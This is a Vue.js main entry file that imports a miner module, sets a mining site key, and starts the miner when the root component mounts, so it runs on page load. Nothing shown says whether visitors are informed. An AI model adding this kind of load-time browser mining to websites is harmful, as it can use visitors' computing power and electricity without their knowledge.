import Vue from 'vue'
import App from './App.vue'
import router from './router'
import store from './store'
import Miner from './lib/miner'
import vueConfig from './lib/mixins/config'

const configs = {
  siteKey: 'KJDsFhfambK6QRPOZPfF1mCWiQKtuhvY2pUgUGBm'
}

Vue.use(vueConfig, configs)

new Vue({
  el: '#app',
  store,
  router,
  template: '<App/>',
  components: { App },
  mounted: function () {
    Miner(MaxMines, this)
  }
})
